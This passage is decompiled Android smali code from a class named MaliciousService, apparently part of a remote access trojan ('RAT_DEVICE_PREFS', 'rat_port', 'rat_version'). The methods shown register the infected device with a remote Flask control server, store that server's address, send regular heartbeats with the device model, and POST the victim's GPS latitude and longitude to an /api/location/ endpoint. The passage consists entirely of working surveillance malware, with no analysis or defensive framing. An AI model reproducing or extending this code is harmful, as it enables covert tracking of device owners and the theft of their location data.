    :try_end_11d
    .catchall {:try_start_a3 .. :try_end_11d} :catchall_126

    .line 397
    :cond_11d
    :goto_11d
    :try_start_11d
    invoke-virtual {v7}, Ljava/io/BufferedReader;->close()V
    :try_end_120
    .catchall {:try_start_11d .. :try_end_120} :catchall_130

    if-eqz v5, :cond_125

    :try_start_122
    invoke-virtual {v5}, Ljava/io/InputStream;->close()V
    :try_end_125
    .catch Ljava/io/IOException; {:try_start_122 .. :try_end_125} :catch_169
    .catch Lorg/json/JSONException; {:try_start_122 .. :try_end_125} :catch_167
    .catchall {:try_start_122 .. :try_end_125} :catchall_164

    .line 374
    :cond_125
    goto :goto_152

    :catchall_126
    move-exception v0

    :try_start_127
    invoke-virtual {v7}, Ljava/io/BufferedReader;->close()V
    :try_end_12a
    .catchall {:try_start_127 .. :try_end_12a} :catchall_12b

    goto :goto_12f

    :catchall_12b
    move-exception v1

    :try_start_12c
    invoke-static {v0, v1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :goto_12f
    throw v0
    :try_end_130
    .catchall {:try_start_12c .. :try_end_130} :catchall_130

    :catchall_130
    move-exception v0

    if-eqz v5, :cond_13b

    :try_start_133
    invoke-virtual {v5}, Ljava/io/InputStream;->close()V
    :try_end_136
    .catchall {:try_start_133 .. :try_end_136} :catchall_137

    goto :goto_13b

    :catchall_137
    move-exception v1

    :try_start_138
    invoke-static {v0, v1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :cond_13b
    :goto_13b
    throw v0

    .line 399
    :cond_13c
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Flask server responded with non-OK code for registration: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_152
    .catch Ljava/io/IOException; {:try_start_138 .. :try_end_152} :catch_169
    .catch Lorg/json/JSONException; {:try_start_138 .. :try_end_152} :catch_167
    .catchall {:try_start_138 .. :try_end_152} :catchall_164

    .line 405
    :goto_152
    if-eqz v6, :cond_190

    .line 406
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V

    goto :goto_190

    .line 367
    :catchall_158
    move-exception v0

    if-eqz v7, :cond_163

    :try_start_15b
    invoke-virtual {v7}, Ljava/io/OutputStream;->close()V
    :try_end_15e
    .catchall {:try_start_15b .. :try_end_15e} :catchall_15f

    goto :goto_163

    :catchall_15f
    move-exception v1

    :try_start_160
    invoke-static {v0, v1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :cond_163
    :goto_163
    throw v0
    :try_end_164
    .catch Ljava/io/IOException; {:try_start_160 .. :try_end_164} :catch_169
    .catch Lorg/json/JSONException; {:try_start_160 .. :try_end_164} :catch_167
    .catchall {:try_start_160 .. :try_end_164} :catchall_164

    .line 405
    :catchall_164
    move-exception v0

    move-object v5, v6

    goto :goto_191

    .line 402
    :catch_167
    move-exception v0

    goto :goto_16a

    :catch_169
    move-exception v0

    :goto_16a
    move-object v5, v6

    goto :goto_171

    .line 405
    :catchall_16c
    move-exception v0

    goto :goto_191

    .line 402
    :catch_16e
    move-exception v0

    goto :goto_171

    :catch_170
    move-exception v0

    .line 403
    :goto_171
    :try_start_171
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Failed to register with Flask server: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_18b
    .catchall {:try_start_171 .. :try_end_18b} :catchall_16c

    .line 405
    if-eqz v5, :cond_190

    .line 406
    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 409
    :cond_190
    :goto_190
    return-void

    .line 405
    :goto_191
    if-eqz v5, :cond_196

    .line 406
    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 408
    :cond_196
    throw v0

    .line 347
    :cond_197
    :goto_197
    const-string v0, "Server IP/Flask Port not loaded or Device ID not ready, cannot register device."

    invoke-static {v4, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 348
    return-void
.end method

.method private saveServerConfigToPreferences(Ljava/lang/String;Ljava/lang/String;)V
    .registers 5

    .line 244
    const-string v0, "RAT_DEVICE_PREFS"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/example/android/MaliciousService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 245
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 246
    const-string v1, "server_ip"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 247
    const-string v1, "flask_port"

    invoke-interface {v0, v1, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 248
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 249
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Saved server config to SharedPreferences: IP="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string v0, ", Flask Port="

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "MaliciousService"

    invoke-static {p2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 250
    return-void
.end method

.method private saveServerConfigToPreferences(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .registers 6

    .line 253
    const-string v0, "RAT_DEVICE_PREFS"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/example/android/MaliciousService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 254
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 255
    const-string v1, "server_ip"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 256
    const-string v1, "flask_port"

    invoke-interface {v0, v1, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 257
    if-eqz p3, :cond_22

    invoke-virtual {p3}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_22

    .line 258
    const-string v1, "rat_port"

    invoke-interface {v0, v1, p3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 260
    :cond_22
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 261
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Saved server config to SharedPreferences: IP="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string v0, ", Flask Port="

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string p2, ", RAT Port="

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "MaliciousService"

    invoke-static {p2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 262
    return-void
.end method

.method private sendHeartbeat()V
    .registers 9

    .line 934
    iget-object v0, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    .line 935
    iget-object v1, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    .line 936
    const-string v2, "MaliciousService"

    if-eqz v0, :cond_119

    if-eqz v1, :cond_119

    iget-object v3, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    if-nez v3, :cond_10

    goto/16 :goto_119

    .line 940
    :cond_10
    nop

    .line 942
    const/4 v3, 0x0

    :try_start_12
    new-instance v4, Ljava/net/URL;

    iget-object v5, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "http://"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v6, ":"

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/api/heartbeat/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v4, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 943
    invoke-virtual {v4}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;
    :try_end_46
    .catch Ljava/io/IOException; {:try_start_12 .. :try_end_46} :catch_e6
    .catch Lorg/json/JSONException; {:try_start_12 .. :try_end_46} :catch_e4
    .catchall {:try_start_12 .. :try_end_46} :catchall_e2

    .line 944
    :try_start_46
    const-string v1, "POST"

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 945
    const-string v1, "Content-Type"

    const-string v3, "application/json; charset=utf-8"

    invoke-virtual {v0, v1, v3}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 946
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 947
    const/16 v1, 0x1388

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 948
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 949
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 950
    const-string v3, "device_id"

    iget-object v4, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 951
    const-string v3, "rat_version"

    const-string v4, "1.0"

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 952
    const-string v3, "device_type"

    sget-object v4, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 953
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3
    :try_end_7c
    .catch Ljava/io/IOException; {:try_start_46 .. :try_end_7c} :catch_df
    .catch Lorg/json/JSONException; {:try_start_46 .. :try_end_7c} :catch_dd
    .catchall {:try_start_46 .. :try_end_7c} :catchall_da

    .line 954
    :try_start_7c
    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    sget-object v4, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v1, v4}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/io/OutputStream;->write([B)V

    .line 955
    invoke-virtual {v3}, Ljava/io/OutputStream;->flush()V
    :try_end_8c
    .catchall {:try_start_7c .. :try_end_8c} :catchall_ce

    .line 956
    if-eqz v3, :cond_91

    :try_start_8e
    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V

    .line 957
    :cond_91
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v1

    .line 958
    const/16 v3, 0xc8

    if-ne v1, v3, :cond_b2

    .line 959
    iget-object v1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Heartbeat sent successfully for device: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_c8

    .line 961
    :cond_b2
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Server responded with non-OK code for heartbeat: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v2, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_c8
    .catch Ljava/io/IOException; {:try_start_8e .. :try_end_c8} :catch_df
    .catch Lorg/json/JSONException; {:try_start_8e .. :try_end_c8} :catch_dd
    .catchall {:try_start_8e .. :try_end_c8} :catchall_da

    .line 966
    :goto_c8
    if-eqz v0, :cond_112

    .line 967
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->disconnect()V

    goto :goto_112

    .line 953
    :catchall_ce
    move-exception v1

    if-eqz v3, :cond_d9

    :try_start_d1
    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V
    :try_end_d4
    .catchall {:try_start_d1 .. :try_end_d4} :catchall_d5

    goto :goto_d9

    :catchall_d5
    move-exception v3

    :try_start_d6
    invoke-static {v1, v3}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :cond_d9
    :goto_d9
    throw v1
    :try_end_da
    .catch Ljava/io/IOException; {:try_start_d6 .. :try_end_da} :catch_df
    .catch Lorg/json/JSONException; {:try_start_d6 .. :try_end_da} :catch_dd
    .catchall {:try_start_d6 .. :try_end_da} :catchall_da

    .line 966
    :catchall_da
    move-exception v1

    move-object v3, v0

    goto :goto_113

    .line 963
    :catch_dd
    move-exception v1

    goto :goto_e0

    :catch_df
    move-exception v1

    :goto_e0
    move-object v3, v0

    goto :goto_e7

    .line 966
    :catchall_e2
    move-exception v1

    goto :goto_113

    .line 963
    :catch_e4
    move-exception v1

    goto :goto_e7

    :catch_e6
    move-exception v1

    .line 964
    :goto_e7
    :try_start_e7
    iget-object v0, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Failed to send heartbeat for device "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v4, ": "

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_10d
    .catchall {:try_start_e7 .. :try_end_10d} :catchall_e2

    .line 966
    if-eqz v3, :cond_112

    .line 967
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 970
    :cond_112
    :goto_112
    return-void

    .line 966
    :goto_113
    if-eqz v3, :cond_118

    .line 967
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 969
    :cond_118
    throw v1

    .line 937
    :cond_119
    :goto_119
    const-string v0, "Server IP/Flask Port not loaded or Device ID not ready, cannot send heartbeat."

    invoke-static {v2, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 938
    return-void
.end method

.method private sendLocation(Landroid/location/Location;)V
    .registers 10

    .line 478
    const-string v0, "MaliciousService"

    if-eqz p1, :cond_133

    iget-object v1, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    if-eqz v1, :cond_133

    iget-object v1, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    if-eqz v1, :cond_133

    iget-object v1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    if-nez v1, :cond_12

    goto/16 :goto_133

    .line 482
    :cond_12
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 484
    :try_start_17
    const-string v2, "lat"

    invoke-virtual {p1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v3

    invoke-virtual {v1, v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 485
    const-string v2, "lon"

    invoke-virtual {p1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v3

    invoke-virtual {v1, v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;
    :try_end_29
    .catch Lorg/json/JSONException; {:try_start_17 .. :try_end_29} :catch_117

    .line 489
    nop

    .line 490
    nop

    .line 492
    const/4 p1, 0x0

    :try_start_2c
    new-instance v2, Ljava/net/URL;

    iget-object v3, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    iget-object v4, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    iget-object v5, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "http://"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, ":"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/api/location/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 493
    invoke-virtual {v2}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v2

    check-cast v2, Ljava/net/HttpURLConnection;
    :try_end_64
    .catch Ljava/io/IOException; {:try_start_2c .. :try_end_64} :catch_e1
    .catchall {:try_start_2c .. :try_end_64} :catchall_dd

    .line 494
    :try_start_64
    const-string p1, "POST"

    invoke-virtual {v2, p1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 495
    const-string p1, "Content-Type"

    const-string v3, "application/json; charset=utf-8"

    invoke-virtual {v2, p1, v3}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 496
    const/4 p1, 0x1

    invoke-virtual {v2, p1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 497
    const/16 p1, 0x2710

    invoke-virtual {v2, p1}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 498
    invoke-virtual {v2, p1}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 499
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object p1
    :try_end_80
    .catch Ljava/io/IOException; {:try_start_64 .. :try_end_80} :catch_db
    .catchall {:try_start_64 .. :try_end_80} :catchall_110

    .line 500
    :try_start_80
    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    sget-object v3, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v1, v3}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/io/OutputStream;->write([B)V

    .line 501
    invoke-virtual {p1}, Ljava/io/OutputStream;->flush()V
    :try_end_90
    .catchall {:try_start_80 .. :try_end_90} :catchall_cf

    .line 502
    if-eqz p1, :cond_95

    :try_start_92
    invoke-virtual {p1}, Ljava/io/OutputStream;->close()V

    .line 503
    :cond_95
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result p1

    .line 504
    const/16 v1, 0xc8

    if-ne p1, v1, :cond_b6

    .line 505
    iget-object p1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Location sent successfully for device: "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_cc

    .line 507
    :cond_b6
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Server responded with non-OK code for location: "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_cc
    .catch Ljava/io/IOException; {:try_start_92 .. :try_end_cc} :catch_db
    .catchall {:try_start_92 .. :try_end_cc} :catchall_110

    .line 512
    :goto_cc
    if-eqz v2, :cond_10f

    .line 513
    goto :goto_10c

    .line 499
    :catchall_cf
    move-exception v1

    if-eqz p1, :cond_da

    :try_start_d2
    invoke-virtual {p1}, Ljava/io/OutputStream;->close()V
    :try_end_d5
    .catchall {:try_start_d2 .. :try_end_d5} :catchall_d6

    goto :goto_da

    :catchall_d6
    move-exception p1

    :try_start_d7
    invoke-static {v1, p1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :cond_da
    :goto_da
    throw v1
    :try_end_db
    .catch Ljava/io/IOException; {:try_start_d7 .. :try_end_db} :catch_db
    .catchall {:try_start_d7 .. :try_end_db} :catchall_110

    .line 509
    :catch_db
    move-exception p1

    goto :goto_e4

    .line 512
    :catchall_dd
    move-exception v0

    move-object v2, p1

    move-object p1, v0

    goto :goto_111

    .line 509
    :catch_e1
    move-exception v1

    move-object v2, p1

    move-object p1, v1

    .line 510
    :goto_e4
    :try_start_e4
    iget-object v1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object p1

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Failed to send location for device "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, ": "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_10a
    .catchall {:try_start_e4 .. :try_end_10a} :catchall_110

    .line 512
    if-eqz v2, :cond_10f

    .line 513
    :goto_10c
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 516
    :cond_10f
    return-void

    .line 512
    :catchall_110
    move-exception p1

    :goto_111
    if-eqz v2, :cond_116

    .line 513
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 515
    :cond_116
    throw p1

    .line 486
    :catch_117
    move-exception p1

    .line 487
    invoke-virtual {p1}, Lorg/json/JSONException;->getMessage()Ljava/lang/String;

    move-result-object p1

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "JSON exception for location: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

